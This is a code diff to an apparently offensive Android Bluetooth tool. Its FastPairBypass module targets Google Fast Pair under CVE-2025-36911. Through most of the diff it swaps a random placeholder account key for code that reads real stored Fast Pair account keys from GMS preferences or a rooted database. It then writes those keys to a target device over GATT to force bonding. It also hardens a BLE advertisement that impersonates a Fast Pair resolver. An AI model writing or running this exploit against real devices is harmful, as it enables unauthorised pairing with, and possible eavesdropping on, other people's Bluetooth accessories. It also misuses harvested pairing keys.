@@ -45,11 +45,13 @@ object FastPairBypass {
      */
     fun executeBypass(device: BluetoothDevice): Map<String, Any> {
         BluesnaferLogger.d(TAG, "Fast Pair bypass on ${device.address}")
+        val appContext = BluetoothMethodHandler.getAppContext()
 
         var gatt: BluetoothGatt? = null
         var success = false
         var modelId: String? = null
         var accountKey: ByteArray? = null
+        var keySource = "none"
         var errorMsg: String? = null
 
         try {
@@ -97,8 +99,16 @@ object FastPairBypass {
                                 modelId = characteristic.getStringValue(0)
                                 BluesnaferLogger.d(TAG, "Model ID: $modelId")
 
-                                // Step 3: Derive/spoof Account Key based on Model ID
-                                accountKey = deriveAccountKey(modelId!!)
+                                val resolved = resolveAccountKey(appContext, modelId!!)
+                                accountKey = resolved.first
+                                keySource = resolved.second
+
+                                if (accountKey == null) {
+                                    errorMsg = "No stored Fast Pair account key for model $modelId"
+                                    gatt.disconnect()
+                                    latch.countDown()
+                                    return
+                                }
 
                                 // Step 4: Write Account Key
                                 val accountKeyChar = gatt.getService(FAST_PAIR_SERVICE_UUID)
@@ -135,14 +145,12 @@ object FastPairBypass {
                             BluesnaferLogger.w(TAG, "createBond failed: ${e.message}")
                         }
 
-                        // Check if bonded after delay
                         Thread.sleep(2000)
-                        if (device.bondState == BluetoothDevice.BOND_BONDED) {
-                            success = true
+                        success = device.bondState == BluetoothDevice.BOND_BONDED
+                        if (success) {
                             BluesnaferLogger.i(TAG, "Fast Pair bypass succeeded - device bonded")
                         } else {
-                            // Could still be successful even if not bonded yet
-                            success = true  // Account Key accepted implies success
+                            BluesnaferLogger.w(TAG, "Account key written but device not bonded (state=${device.bondState})")
                         }
 
                         gatt.disconnect()
@@ -167,10 +175,16 @@ object FastPairBypass {
 
             return mapOf(
                 "success" to success,
-                "message" to if (success) "Fast Pair bypass succeeded - device trusted" else "Fast Pair bypass attempted",
+                "message" to when {
+                    success -> "Fast Pair bypass succeeded - device bonded"
+                    accountKey != null -> "Account key written but bonding incomplete"
+                    else -> (errorMsg ?: "Fast Pair bypass failed - no valid account key")
+                },
                 "modelId" to (modelId ?: "unknown"),
                 "accountKeySet" to (accountKey != null),
+                "keySource" to keySource,
                 "bondState" to device.bondState,
+                "error" to (errorMsg ?: ""),
                 "cve" to "CVE-2025-36911",
                 "severity" to "HIGH",
                 "service" to "Fast_Pair"
@@ -191,28 +205,37 @@ object FastPairBypass {
     }
 
     /**
-     * Derive/spoof a valid-looking Account Key based on Model ID
-     * Real Fast Pair uses elliptic curve cryptography with Google's private key
-     * For bypass, we generate a random valid-looking key
-     * Real exploit would use leaked/backdoored private key
+     * Resuelve Account Key desde almacenamiento local (GMS prefs / DB con root).
+     * No genera claves aleatorias — solo usa claves reales previamente emparejadas.
      */
-    private fun deriveAccountKey(modelId: String): ByteArray? {
-        return try {
-            // In a real Fast Pair bypass:
-            // - Account Key = ECDSA signature of (Device ID + Model ID) using Google's private key
-            // - Or use pre-computed valid key for known model
-            //
-            // For implementation: generate 16-byte random key that looks plausible
-            // Real exploit would use actual leaked keys or signature algorithm
-            val random = Random()
-            val key = ByteArray(16)
-            random.nextBytes(key)
+    private fun resolveAccountKey(context: Context?, modelId: String): Pair<ByteArray?, String> {
+        if (context == null) return Pair(null, "no_context")
 
-            // Mark as "dummy but plausible" - real CVE would have proper crypto
-            BluesnaferLogger.d(TAG, "Generated Account Key (dummy): ${key.joinToString("") { "%02x".format(it) }}")
-            key
-        } catch (e: Exception) {
-            BluesnaferLogger.e(TAG, "Account key derivation failed: ${e.message}")
+        val stored = extractStoredKeys(context)
+        val entries = stored["keys"] as? List<*> ?: emptyList<Any>()
+        if (entries.isEmpty()) return Pair(null, "no_stored_keys")
+
+        for (entry in entries) {
+            val text = entry.toString()
+            val hex = extractHexKey(text)
+            if (hex != null && hex.size == 16) {
+                BluesnaferLogger.d(TAG, "Using stored account key (${hex.size} bytes) for model $modelId")
+                return Pair(hex, if (text.startsWith("db_row")) "root_db" else "gms_preferences")
+            }
+        }
+
+        return Pair(null, "no_parseable_key")
+    }
+
+    private fun extractHexKey(text: String): ByteArray? {
+        val hexPattern = Regex("""([0-9a-fA-F]{32})""")
+        val match = hexPattern.find(text) ?: return null
+        val hex = match.groupValues[1]
+        return try {
+            ByteArray(hex.length / 2) { i ->
+                hex.substring(i * 2, i * 2 + 2).toInt(16).toByte()
+            }
+        } catch (_: Exception) {
             null
         }
     }
@@ -236,23 +259,36 @@ object FastPairBypass {
                 .addServiceUuid(ParcelUuid(FAST_PAIR_SERVICE_UUID))
                 .build()
 
+            val advertiseStarted = java.util.concurrent.atomic.AtomicBoolean(false)
+            val advertiseFailed = java.util.concurrent.atomic.AtomicBoolean(false)
             val callback = object : AdvertiseCallback() {
                 override fun onStartSuccess(settingsInEffect: AdvertiseSettings?) {
+                    advertiseStarted.set(true)
                     BluesnaferLogger.d(TAG, "Fast Pair proximity advertisement started")
+                }
+                override fun onStartFailure(errorCode: Int) {
+                    advertiseFailed.set(true)
+                    BluesnaferLogger.e(TAG, "Fast Pair advertise failed: $errorCode")
                 }
             }
 
-            // Start advertising as Fast Pair resolver
             val advertiser = adapter?.bluetoothLeAdvertiser
-            advertiser?.startAdvertising(settings, data, callback)
+            if (advertiser == null) {
+                return mapOf(
+                    "success" to false,
+                    "error" to "BLE advertiser no disponible",
+                    "cve" to "CVE-2025-36911"
+                )
+            }
 
-            Thread.sleep(5000)  // Advertise for 5 seconds
-
-            advertiser?.stopAdvertising(callback)
+            advertiser.startAdvertising(settings, data, callback)
+            Thread.sleep(5000)
+            try { advertiser.stopAdvertising(callback) } catch (_: Exception) {}
 
             mapOf(
-                "success" to true,
-                "message" to "Fast Pair proximity trigger sent",
+                "success" to (advertiseStarted.get() && !advertiseFailed.get()),
+                "advertiseStarted" to advertiseStarted.get(),
+                "message" to if (advertiseStarted.get()) "Fast Pair proximity trigger enviado" else "Fast Pair proximity: advertise no inició",
                 "cve" to "CVE-2025-36911"
             )
         } catch (e: Exception) {
